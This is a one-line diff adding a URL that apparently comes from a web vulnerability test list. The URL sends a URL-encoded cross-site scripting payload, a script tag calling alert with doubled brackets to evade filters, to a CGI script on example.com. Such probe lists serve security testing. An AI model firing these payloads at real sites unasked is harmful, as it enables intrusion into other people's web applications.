@@ -1,0 +1,1 @@
+http://www.example.com/pbcgi.cgi?name=%3C%3CSCRIPT%3Ealert%28%22XSS%22%29%3B%2F%2F%3C%3C%2FSCRIPT%3E
